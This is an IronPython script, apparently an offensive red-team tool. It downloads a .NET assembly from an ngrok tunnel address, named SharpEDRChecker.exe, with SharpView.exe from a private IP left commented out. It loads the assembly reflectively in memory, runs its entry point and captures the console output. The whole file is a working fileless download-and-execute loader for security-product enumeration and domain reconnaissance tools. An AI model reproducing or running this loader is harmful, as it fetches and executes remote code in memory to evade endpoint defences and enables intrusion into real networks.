import clr
clr.AddReference("System")
clr.AddReference("System.Net")
clr.AddReference('mscorlib')
import System,System.Net

from System.Net import ServicePointManager, SecurityProtocolType
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

from System import Console
from System.IO import StringWriter
from System import Net

def download_file(url):
    try:
        web_client = System.Net.WebClient()
        data = web_client.DownloadData(url)
        return data
    except Exception as e:
        raise Exception(f"Failed to download file from {url}: {e}")

def execute_assembly(data,args):
    try:
        assembly = System.Reflection.Assembly.Load(data)
        entry_point = assembly.EntryPoint
        if entry_point is not None:
            parameters = args #sys.argv[1:]
            parameters_array = System.Array[System.String](parameters)
            entry_point.Invoke(None, [parameters_array])
            return
        else:
            return "Assembly does not have an entry point."
    except Exception as e:
        raise Exception(f"Failed to execute assembly: {e}")

def mem_exec(args):
    try:
        url = f"https://constantly-happy-heron.ngrok-free.app/SharpEDRChecker.exe" #"http://192.168.133.132/SharpView.exe"
        data = download_file(url)
        execute_assembly(data,args)
    except Exception as e:
        print(f"An error occurred: {e}")

sw = StringWriter()
oldConsOut = Console.Out
Console.SetOut(sw)
Console.WriteLine

if __name__ == "__main__":
    mem_exec(args)
    pass

Console.SetOut(oldConsOut)
captured_output = sw.ToString()
# with open('t3st.txt', 'w') as f:
#     f.write(captured_output)
print(captured_output)